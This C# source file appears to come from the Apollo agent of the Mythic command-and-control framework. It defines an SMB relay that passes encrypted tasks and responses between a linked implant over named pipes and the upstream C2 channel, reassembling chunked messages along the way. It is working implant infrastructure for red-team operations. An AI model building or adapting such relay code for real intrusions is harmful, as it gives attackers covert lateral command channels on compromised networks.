using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Mythic.C2Profiles;
using System.IO.Pipes;
using System.Runtime.Serialization.Formatters.Binary;
using IPC;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Threading;
using Apollo.MessageInbox;
using Apollo.CommandModules;
using static Utils.DebugUtils;

namespace C2Relays
{
    class SMBRelay : Relay
    {
        internal SMBClientProfile MessageProducer;
        //internal C2Profile MessageConsumer;
        //public string AgentUUID;
        public SMBRelay(SMBClientProfile producer, C2Profile consumer, string taskID) : base(producer, consumer, taskID)
        {
            MessageProducer = producer;
        }

        public override bool SendMessageToProducer(string message)
        {
            bool bRet = true;
            try
            {
                DebugWriteLine($"Attempting to decrypt message of length {message.Length}...");
                var deleteMe = MessageConsumer.cryptor.Decrypt(message);
                DebugWriteLine($"SUCCESS! Decrypted message is of length: {deleteMe.Length}");
                DebugWriteLine($"Attempting to send message of length {deleteMe.Length} to {MessageProducer.HostName} using profile {MessageProducer.GetType().Name}...");
                MessageProducer.Send("", MessageConsumer.cryptor.Decrypt(message));
                DebugWriteLine($"SUCCESS! Sent message of length {deleteMe.Length} to {MessageProducer.HostName} using profile {MessageProducer.GetType().Name}!");
            } catch (Exception ex)
            {
                DebugWriteLine($"ERROR! Could not send message of length {message.Length} to {MessageProducer.HostName} using profile {MessageProducer.GetType().Name}. \n\tReason: {ex.Message}\n\tStack Trace: {ex.StackTrace}");
                bRet = false;
            }
            return bRet;
        }

        public override void ChangeConsumerProfile(C2Profile profile)
        {
            MessageConsumer = profile;
        }

        public override void SendMessagesToProducers()
        {
            Mythic.Structs.TaskResponse apfellResponse;
            string json;
            string id;
            DebugWriteLine($"Beginning loop to send messages from {MessageProducer.GetType().Name} to {MessageConsumer.GetType().Name}");
            while (MessageProducer.IsConnected() && !StopAllThreads)
            {
                try // Try block for HTTP requests
                {
                    //Dictionary<string, string>[] delegateMessages = new Dictionary<string, string>[] { };
                    if (SyncDelegateMessageRequestQueue.Count > 0)
                    {
                        DebugWriteLine($"{MessageProducer.HostName} using {MessageProducer.GetType().Name} has {SyncDelegateMessageRequestQueue.Count} messages to send.");
                        var requestMessages = PopDelegateMessageRequestQueue();
                        id = Guid.NewGuid().ToString();
                        apfellResponse = new Mythic.Structs.TaskResponse
                        {
                            action = "post_response",
                            responses = new Apollo.Tasks.ApolloTaskResponse[] { },
                            delegates = requestMessages,
                            message_id = id
                        };
                        DebugWriteLine($"Attempting to serialize {requestMessages.Length} messages to JSON...");
                        json = JsonConvert.SerializeObject(apfellResponse);
                        DebugWriteLine($"SUCCESS! Serialized {requestMessages.Length} messages to JSON.");
                        DebugWriteLine($"Attempting to send new message with ID {id} carrying {requestMessages.Length} delegate messages to {MessageConsumer.GetType().Name}...");
                        if (MessageConsumer.Send(id, json))
                        {
                            // I think this is where the issue is for SMB to SMB relays
                            DebugWriteLine($"SUCCESS! Sent new message with ID {id} carrying {requestMessages.Length} delegate messages to {MessageConsumer.GetType().Name}.");
                            DebugWriteLine($"Waiting for reply to message ID {id} from {MessageConsumer.GetType().Name}...");
                            Mythic.Structs.TaskResponse resp  = JsonConvert.DeserializeObject<Mythic.Structs.TaskResponse>((string)Inbox.GetMessage(id));
                            DebugWriteLine($"SUCCESS! Received reply to message ID {id} from {MessageConsumer.GetType().Name}!");
                            if (resp.delegates.Length > 0)
                            {
                                DebugWriteLine($"Message {id} from {MessageConsumer.GetType().Name} had {resp.delegates.Length} messages to send. Sending to {MessageProducer.HostName} over {MessageProducer.GetType().Name}");
                                int i = 0;
                                foreach (var dmsg in resp.delegates)
                                {
                                    SendMessageToProducer(dmsg[dmsg.Keys.First()]);
                                    i++;
                                    DebugWriteLine($"Sent {i} of {resp.delegates.Length} messages originating from message with inbox ID {id} from {MessageConsumer.GetType().Name} to {MessageProducer.HostName} over {MessageProducer.GetType().Name}");
                                }
                                DebugWriteLine($"Finished sending {resp.delegates.Length} delegate messages originating from message with inbox ID {id} from {MessageConsumer.GetType().Name} to {MessageProducer.HostName} over {MessageProducer.GetType().Name}");
                            }
                        } else
                        {
                            DebugWriteLine($"ERROR! Failed to send message from {MessageConsumer.GetType().Name} to {MessageProducer.HostName} over {MessageProducer.GetType().Name}");
                        }
                    }
                    if (SyncDelegateMessageTaskQueue.Count > 0)
                    {
                        DebugWriteLine($"Have {SyncDelegateMessageTaskQueue.Count} tasks to send from {MessageConsumer.GetType().Name} to {MessageProducer.HostName} over {MessageProducer.GetType().Name}");
                        var msgs = PopDelegateMessageTaskQueue();
                        DebugWriteLine($"Popped {msgs.Length} tasks to send from {MessageConsumer.GetType().Name} to {MessageProducer.HostName} over {MessageProducer.GetType().Name}");
                        int i = 0;
                        foreach (var dmsg in msgs)
                        {
                            SendMessageToProducer(dmsg);
                            i++;
                            DebugWriteLine($"Sent {i} of {msgs.Length} tasks from {MessageConsumer.GetType().Name} to {MessageProducer.HostName} over {MessageProducer.GetType().Name}");
                        }
                    }
                    //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                    //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
                }
                catch (Exception ex) // Catch exceptions from HTTP request or retry exceeded
                {
                    DebugWriteLine($"ERROR! Reason: {ex.Message}\n\tStack Trace: {ex.StackTrace}");
                }
            }
            DebugWriteLine($"Exiting function.");
        }

        new public void BeginRelay(string registrationGuidMsgID)
        {
            DebugWriteLine($"Initiazing relay with registration message ID: {registrationGuidMsgID}...");
            MessageProducerThread = new Thread(() => ReadMessagesFromProducer(registrationGuidMsgID));
            MessageConsumerThread = new Thread(() => SendMessagesToProducers());
            MessageProducerThread.Start();
            MessageConsumerThread.Start();
            DebugWriteLine($"SUCCESS! Relay initialized with registration message ID: {registrationGuidMsgID}");
            base.BeginRelay(registrationGuidMsgID);
        }

        public override void ReadMessagesFromProducer(string registrationGuidMsgID)
        {
            string producerMessage = "";
            SMBMessage smbMsg = new SMBMessage();
            Dictionary<string, List<SMBMessage>> chunkedMessages = new Dictionary<string, List<SMBMessage>>();
            DebugWriteLine($"New UUID Registration for Agent will have Message ID: {registrationGuidMsgID}");
            DebugWriteLine($"Beginning loop to read messages from {MessageProducer.HostName} over {MessageProducer.GetType().Name}...");
            while (MessageProducer.IsConnected() && !StopAllThreads)
            {
                try
                {
                    DebugWriteLine($"Waiting to read message from {MessageProducer.HostName} over {MessageProducer.GetType().Name}...");
                    smbMsg = MessageProducer.ReadMessage();
                    DebugWriteLine($"SUCCESS! Got a message from {MessageProducer.HostName} over {MessageProducer.GetType().Name}!");
                    if (smbMsg != null && smbMsg.MessageObject != null)
                    {
                        DebugWriteLine($"Message from {MessageProducer.HostName} over {MessageProducer.GetType().Name} was non-null.");
                        if (smbMsg.MessageType == "uuid_registration")
                        {
                            DebugWriteLine($"UUID Registration message from {MessageProducer.HostName} over {MessageProducer.GetType().Name} received!");
                            producerMessage = Encoding.UTF8.GetString((byte[])smbMsg.MessageObject);
                            // This should pop twice. First on initial connect, then second on received UUID
                            AgentUUID = producerMessage;
                            DebugWriteLine($"Set AgentUUID to {AgentUUID}. Adding registration message to inbox with message ID {registrationGuidMsgID}...");
                            Inbox.AddMessage(registrationGuidMsgID, producerMessage);
                            DebugWriteLine($"SUCCESS! Added registration message to inbox with message ID {registrationGuidMsgID}");
                        } else if (smbMsg.MessageType == "chunked_message")
                        {
                            //SMBChunkedMessage tmp = (SMBChunkedMessage)smbMsg;
                            if (!chunkedMessages.ContainsKey(smbMsg.MessageID))
                                chunkedMessages[smbMsg.MessageID] = new List<SMBMessage>();
                            chunkedMessages[smbMsg.MessageID].Add(smbMsg);
                            if (chunkedMessages[smbMsg.MessageID].Count == smbMsg.MaxMessages)
                            {
                                byte[] fullMessage = SMBMessage.CombineChunkedMessages(chunkedMessages[smbMsg.MessageID]);
                                chunkedMessages.Remove(smbMsg.MessageID);
                                producerMessage = Encoding.UTF8.GetString(fullMessage);
                                AddMessageToRequestQueue(producerMessage);
                            }
                        } else
                        {
                            DebugWriteLine($"Adding new message from {MessageProducer.HostName} ({MessageProducer.GetType().Name}) to {MessageConsumer.GetType().Name}'s request queue...");
                            producerMessage = Encoding.UTF8.GetString((byte[])smbMsg.MessageObject);
                            AddMessageToRequestQueue(producerMessage);
                            DebugWriteLine($"SUCCESS! Added new message from {MessageProducer.HostName} ({MessageProducer.GetType().Name}) to {MessageConsumer.GetType().Name}'s request queue.");
                        }
                    }
                } catch (Exception ex)
                {
                    DebugWriteLine($"ERROR! Reason: {ex.Message}\n\tStackTrack: {ex.StackTrace}");
                    StopAllThreads = true;
                }
                finally
                {
                    producerMessage = "";
                    smbMsg = null;
                    //Thread.Sleep(SleepTime);
                }
            }
            DebugWriteLine($"Stopped reading messages from {MessageProducer.HostName} over {MessageProducer.GetType().Name}");

        }
    }
}